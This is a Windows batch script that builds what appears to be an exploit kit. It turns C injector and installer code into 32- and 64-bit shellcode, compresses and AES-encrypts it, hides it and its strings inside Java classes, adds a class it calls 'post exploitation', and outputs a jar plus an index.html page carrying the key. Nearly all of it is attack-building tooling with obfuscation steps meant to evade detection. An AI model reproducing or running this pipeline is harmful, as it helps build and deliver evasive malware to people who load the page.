@echo OFF
@del src\java\*.class
@del /f /q tmp\*
@del /f /q release\*.jar
@set ORIGINALPATH=%PATH%
@set PATH=%~dp0mingw\bin;%ORIGINALPATH%
@echo [+]   Building installer32...
@gcc -w -Os -fomit-frame-pointer -fexpensive-optimizations -S -std=gnu99 -masm=intel src\C\installer.c -o tmp\installer32.s
@echo [+]   Converting 32 bit code to nasm...
@bin\preShellcode32.exe < tmp\installer32.s >> tmp\installer32.asm
@set PATH=%~dp0mingw64\bin;%ORIGINALPATH%
@echo [+]   Building installer64...
@gcc -w -DCODE64 -Os -fomit-frame-pointer -fexpensive-optimizations -S -std=gnu99 -masm=intel -march=athlon64 src\C\installer.c -o tmp\installer64.s
@echo [+]   Converting 64 bit code to nasm...
@bin\preShellcode64.exe < tmp\installer64.s >> tmp\installer64.asm
@set PATH=%~dp0mingw\bin;%ORIGINALPATH%
@echo [+]   Assembling files...
@bin\nasm -w-all -fbin tmp\installer32.asm
@bin\nasm -w-all -fbin tmp\installer64.asm
@bin\cenc.exe tmp\installer32 > tmp\installer32.dump
@bin\cenc.exe tmp\installer64 > tmp\installer64.dump
rem echo "\xcc" > tmp\installer64.dump
@bin\replacer.exe src\C\inject.c tmp\installer32.dump //INSTALLER32 > tmp\inject_.c
@bin\replacer.exe tmp\inject_.c tmp\installer64.dump //INSTALLER64 > tmp\inject.c
@echo [+]   Building inject32...
@gcc -w -Os -fomit-frame-pointer -fexpensive-optimizations -S -std=gnu99 -masm=intel tmp\inject.c -o tmp\inject.s
@echo [+]   Converting 32 bit code to nasm...
@bin\toShellcode32.exe < tmp\inject.s >> tmp\inject32.asm
@set PATH=%~dp0mingw64\bin;%ORIGINALPATH%
@echo [+]   Building wow64...
@gcc -w -Os -fomit-frame-pointer -fexpensive-optimizations -S -std=gnu99 -masm=intel -march=athlon64 src\C\wow64.c -o tmp\wow64.s
@echo [+]   Building inject64...
@gcc -w -DCODE64 -Os -fomit-frame-pointer -fexpensive-optimizations -S -std=gnu99 -masm=intel -march=athlon64 tmp\inject.c -o tmp\inject.s
@echo [+]   Converting 64 bit code to nasm...
@bin\toShellcodeWow64.exe < tmp\wow64.s >> tmp\inject32.asm
@bin\toShellcode64.exe < tmp\inject.s > tmp\inject64.asm
@echo [+]   Merging 32 and wow64...
@bin\mergeShellcodes.exe < tmp\inject32.asm >> tmp\injectFull32.asm
@echo [+]   Assembling files...
@bin\nasm -w-all -fbin tmp\injectFull32.asm
@bin\nasm -w-all -fbin tmp\inject64.asm
@set PATH="c:\Program Files (x86)\Java\jdk1.6.0_30\bin";%ORIGINALPATH%
@echo [+]   Generating key....
@java GenKey tmp\key.data
@echo [+]   Compressing key...
@java Compress tmp\key.data tmp\key key_size > tmp\key.dump
@bin\replacer.exe tmp\key.dump src\html\separator2.txt "static int key_size = " > tmp\key_.dump
@bin\replacer.exe tmp\key_.dump src\html\separator2.txt ";" > tmp\key__.dump
@java ToBigInt tmp\key > tmp\key_
@echo [+]   Generating html...
@bin\replacer.exe src\html\index.html tmp\key_ //KEY > tmp\index.html
@bin\replacer.exe tmp\index.html tmp\key__.dump //K_SIZE > release\index.html
@echo [+]   Compressing payload...
@java Compress tmp\injectFull32 tmp\injectFull32_ shellcode32_size > tmp\payload.dump
@java Compress tmp\inject64 tmp\inject64_ shellcode64_size >> tmp\payload.dump
@echo [+]   Encrypting payload...
@java AesEncrypt tmp\injectFull32_ tmp\injectFull32__ tmp\key.data
@java AesEncrypt tmp\inject64_ tmp\inject64__ tmp\key.data
@echo static byte shellcode32[] = { >> tmp\payload.dump
@bin\javaenc.exe tmp\injectFull32__ >> tmp\payload.dump
@echo }; >> tmp\payload.dump
@echo static byte shellcode64[] = { >> tmp\payload.dump
@bin\javaenc.exe tmp\inject64__ >> tmp\payload.dump
@echo }; >> tmp\payload.dump
@bin\replacer.exe src\java\Krako.java tmp\payload.dump //PAYLOAD_CODE > tmp\Krako.java
@echo [+]   Building post exploitation class...
@javac -XDignore.symbol.file -target 1.5 -g:none src\java\A.java
@echo [+]   Compressing post exploitation class...
@java Compress src\java\A.class tmp\A_.dump uclass_size > tmp\Asize.dump
@echo [+]   Encrypting post exploitation class...
@java AesEncrypt tmp\A_.dump tmp\A__.dump tmp\key.data
@bin\javaenc.exe tmp\A__.dump > tmp\A.dump
@bin\replacer src\java\MyLoader.java tmp\A.dump //CLASS_CODE > tmp\MyLoader_.java
@bin\replacer tmp\MyLoader_.java tmp\ASize.dump //CLASS_SIZE > tmp\MyLoader.java
@echo [+]   Encrypting strings...
@java AesEncrypt src\java\strings.data tmp\strings_.dump tmp\key.data
@bin\javaenc.exe tmp\strings_.dump > tmp\strings.dump
@bin\replacer src\java\B.java tmp\strings.dump //ENC_STRINGS > tmp\B.java
@echo [+]   Building all classes...
@javac -XDignore.symbol.file -target 1.5 -g:none tmp\Krako.java tmp\MyLoader.java tmp\B.java
@echo [+]   Generating JAR: release\kraka.jar
cd tmp
@jar cf ..\release\kraka.jar Krako.class MyLoader.class B.class
cd ..

